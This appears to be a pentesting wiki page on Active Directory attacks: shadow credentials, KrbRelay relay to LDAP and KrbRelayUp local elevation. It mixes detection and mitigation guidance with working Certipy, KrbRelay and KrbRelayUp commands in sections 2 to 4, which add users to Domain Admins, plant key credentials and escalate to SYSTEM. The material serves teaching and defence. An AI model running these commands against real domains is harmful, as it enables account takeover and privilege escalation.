---
title: "Shadow credentials, KrbRelay and KrbRelayUp"
tags: [windows, active-directory, kerberos, shadow-credentials, krbrelay, krbrelayup, pkinit, ldap]
---

# Shadow credentials, KrbRelay and KrbRelayUp

**English** | [🇪🇸 Español](shadow-credentials-krbrelay.md)

## 1. When to look here

Three techniques often appear together in AD, but they are **not the same**:

| Technique | What it is | What it needs |
|---|---|---|
| Shadow credentials | Add a key to `msDS-KeyCredentialLink` and authenticate via PKINIT | Write access to the attribute and a KDC with a certificate |
| KrbRelay | Relay a Kerberos authentication to LDAP/LDAPS or another service | LDAP without signing/channel binding and a CLSID/context that forces authentication |
| KrbRelayUp | Automate relay + RBCD or shadow credential + local elevation | A local context on a domain host and KrbRelay's conditions |

A vulnerable ADCS template is **ESC1/ESC4/ESC8**, not shadow credentials. A relay to LDAP is not RBCD by itself: RBCD is an object modified afterwards.

## 2. Shadow credentials

### 2.1 What gets written

`msDS-KeyCredentialLink` is a multi-valued attribute introduced in Windows Server 2016 for Windows Hello for Business **Key Trust**. It stores a `KEYCREDENTIALLINK_BLOB` with the public key and metadata; the KDC uses it for PKINIT. It is neither a password nor a CA-issued certificate.

Microsoft documents that the validated write requires the requester to be the object itself and the key to use `KeyUsage = NGC` and `KeySource = AD`; in an attack, the effective right usually comes from `GenericWrite`, `GenericAll`, `WriteProperty` or an equivalent ACL. The exact validation depends on the object and write type; "having LDAP" is not enough.

### 2.2 Conditions

- The target is a user or computer object.
- The attacker can write `msDS-KeyCredentialLink` (or delegate that right).
- The DC has a KDC certificate for **PKINIT**. Without it, authentication fails with `KDC_ERR_PADATA_TYPE_NOSUPP`; that does not turn the technique into ESC1.
- Clocks are synchronised (Kerberos tolerates ±5 minutes).
- No ADCS template or CA issuance is needed for the attacker's certificate: the key is registered directly.

### 2.3 Attack with Certipy

With credentials of an account holding the right:

```bash
certipy shadow auto -username '<USER>@<DOMAIN>' -password '<PASS>' \
  -account '<TARGET>' -target '<DC>'
```

`shadow auto` generates a key, writes the blob, requests a TGT via PKINIT and returns a `.pfx` and a `.ccache`. From a ticket:

```bash
KRB5CCNAME='<USER>.ccache' certipy shadow auto \
  -username '<USER>@<DOMAIN>' -account '<TARGET>' -k -target '<DC>'
```

Authentication and hash recovery:

```bash
certipy auth -pfx '<TARGET>.pfx' -dc-ip '<DC>'
# alternative: gettgtpkinit.py -cert-pfx '<TARGET>.pfx' -pfx-pass '<PFX_PASS>' \
#   '<DOMAIN>/<TARGET>' '<TARGET>.ccache'
```

With the TGT, access whatever the account is allowed. If the target is a computer, remember that its ticket and hash are not an interactive session: depending on the case, use S4U2Self, a service or lateral movement.

To remove the added keys:

```bash
certipy shadow clear -username '<USER>@<DOMAIN>' -password '<PASS>' \
  -account '<TARGET>' -target '<DC>'
```

**Careful:** deleting every entry on an object that uses Windows Hello for Business breaks the user's logon. During an engagement, record what was added and remove only your own values.

### 2.4 Persistence

The key survives a password change. It is **persistence** as well as escalation: rotating the password does not remove it. The response is to remove the `msDS-KeyCredentialLink` value and review other key credentials.

## 3. KrbRelay

### 3.1 What it does

KrbRelay is a **Kerberos relay** framework. It forces a machine or user authentication through a COM CLSID, captures the AP-REQ and presents it to LDAP/LDAPS, HTTP, EWS, SMBv2, RPC or SAMR/SCMR, among others. In AD, the LDAP variant can write attributes such as group membership, `msDS-KeyCredentialLink` or `msDS-AllowedToActOnBehalfOfOtherIdentity`.

It is not a memory exploit or a credential dump: it is an **authentication relay**. The identity reaching LDAP is the coerced account, not the attacker.

### 3.2 Conditions

- **LDAP signing not required** for LDAP relay; strict channel binding also blocks it.
- The CLSID must allow network authentication with a suitable impersonation level (`IDENTIFY` is often enough for LDAP; SMB needs more).
- The session context must be able to start the COM server; in non-interactive WinRM, use a wrapper such as `RunasCs`.
- Synchronised clocks.
- If creating a computer account for RBCD, `MachineAccountQuota` must allow it.
- The DC must be reachable over the chosen protocol; LDAPS is not immune when channel binding is not enforced.

### 3.3 Commands

```powershell
# Add a group member through LDAP relay
.\KrbRelay.exe -spn ldap/<DC> ^
  -clsid 90f18417-f0f1-484e-9d3c-59dceee5dbd8 ^
  -add-groupmember "Domain Admins" <USER>

# Write a shadow credential on the relayed identity
.\KrbRelay.exe -spn ldap/<DC> ^
  -clsid 90f18417-f0f1-484e-9d3c-59dceee5dbd8 -shadowcred

# Cross-session: different CLSID and session
.\KrbRelay.exe -spn ldap/<DC> -session 2 ^
  -clsid 354ff91b-5e49-4bdc-a8e6-1cb6c6877182 -shadowcred <TARGET>
```

`-rbcd <SID>` writes `msDS-AllowedToActOnBehalfOfOtherIdentity`; `-shadowcred [target]` writes `msDS-KeyCredentialLink`; `-add-groupmember` changes membership. The CLSID is not universal: it changes with the session and the service being coerced.

## 4. KrbRelayUp

### 4.1 What it adds

KrbRelayUp is a **local privilege escalation** wrapper for domain-joined hosts. It chains:

1. optional computer account creation;
2. coercion of the local machine account's authentication;
3. relay of that authentication to LDAP;
4. RBCD or shadow credential on the machine account;
5. S4U2Self/SCMUACBypass to run as SYSTEM.

The critical condition is the same: **LDAP signing not enforced** in the LDAP variant. The ADCS Web Enrollment variant avoids LDAP but depends on the endpoint being available and not requiring EPA.

### 4.2 Commands

```powershell
# RBCD: create a computer account and relay
.\KrbRelayUp.exe relay -d '<DOMAIN>' -cn '<COMPUTER>' -cp '<PASS>' -c -m rbcd
.\KrbRelayUp.exe spawn -d '<DOMAIN>' -cn '<COMPUTER>' -cp '<PASS>' -i administrator

# Shadow credential, without creating another computer account
.\KrbRelayUp.exe full -m shadowcred --ForceShadowCred
```

`-m rbcd` needs a computer account (owned or created with `-c`) and `MachineAccountQuota`; `-m shadowcred` does not. `-m adcs` uses Web Enrollment. Syntax changes between versions: check `-h` before running.

### 4.3 Practical differences

| Question | KrbRelay | KrbRelayUp |
|---|---|---|
| Level | Manual primitive | Automated chain |
| Goal | LDAP or another service | Local elevation to SYSTEM |
| Modifies | Group, shadow credential or RBCD | RBCD/shadow credential + S4U2Self |
| Needs local context | Not necessarily | Yes, on a domain host |
| Needs a computer account | Only for RBCD | Only in the RBCD variant |
| LDAP signing | Must be disabled | Also, except the ADCS variant |

## 5. Detection

- **5136** (Directory Service Changes) on `msDS-KeyCredentialLink` or `msDS-AllowedToActOnBehalfOfOtherIdentity`; preserve the attribute value and writer SID.
- **4662** (Directory Service Access) when the object has a SACL; correlate writer and source host.
- Anomalous **4768/4769**: PKINIT from an unusual host, a TGT for an account that does not use WHfB, or a service with an odd SPN.
- **4624** type 3/10 from the DC or an uninventoried admin host.
- **4741** (computer account created) and **4720** (user created) in the RBCD variant.
- **7045/4697** if the final phase installs a service.
- In LDAP, review signing/channel-binding failures and Kerberos binds from non-DC hosts.

The key correlation is **who writes** (5136/4662), **from where** (4624/4768) and **which account benefits** (4768/4769). A single alert cannot distinguish legitimate WHfB enrolment from abuse.

## 6. Mitigation

- Restrict `GenericWrite`, `GenericAll` and `WriteProperty` over users and computers; apply tiering and review ACLs with BloodHound.
- Audit `msDS-KeyCredentialLink` and `msDS-AllowedToActOnBehalfOfOtherIdentity`; alert on writes outside the WHfB enrolment workflow.
- Remove orphaned or unknown keys; do not blindly delete those of WHfB users.
- Require **LDAP signing** and **channel binding**; this is the direct mitigation for LDAP relay. It does not stop a legitimate authenticated write, so it does not replace ACL control.
- Set `MachineAccountQuota` to 0 when unmanaged computers are not needed; monitor 4741.
- Restrict or protect ADCS Web Enrollment (EPA, strong authentication) if KrbRelayUp can use the ADCS variant.
- Review KB5014754 and the key-trust model, but do not present it as a fix for a delegated ACL.

## 7. Common mistakes

- **"Shadow credentials = ESC1"**: no. ESC1 is a template that lets the requester choose the subject; shadow credentials is key trust on an attribute.
- **"KrbRelay = RBCD"**: no. KrbRelay is the relay; RBCD is one possible write afterwards.
- **"LDAPS prevents relay"**: only when channel binding is enforced. LDAPS without binding is not enough.
- **"The attacker's certificate comes from the CA"**: shadow credentials do not request a CA certificate; the key is registered in the attribute.
- **"Deleting all `msDS-KeyCredentialLink` is safe"**: it can break WHfB. Document and remove only what was added.
- **"PKINIT always works"**: without a KDC certificate it fails with `KDC_ERR_PADATA_TYPE_NOSUPP`.

## 8. References

- <https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/f70afbcc-780e-4d91-850c-cfadce5bb15c>
- <https://learn.microsoft.com/en-us/windows/security/identity-protection/hello-for-business/deploy/hybrid-key-trust>
- <https://specterops.io/blog/2021/06/17/shadow-credentials-abusing-key-trust-account-mapping-for-account-takeover>
- <https://www.microsoft.com/en-us/security/blog/2022/05/25/detecting-and-preventing-privilege-escalation-attacks-leveraging-kerberos-relaying-krbrelayup>
- <https://github.com/cube0x0/KrbRelay>
- <https://github.com/Dec0ne/KrbRelayUp>
- <https://github.com/ly4k/Certipy>
- <https://support.microsoft.com/en-us/servicing/os/windows-server/2022/05/kb5014754-certificate-based-authentication-changes-on-windows-domain-controllers>
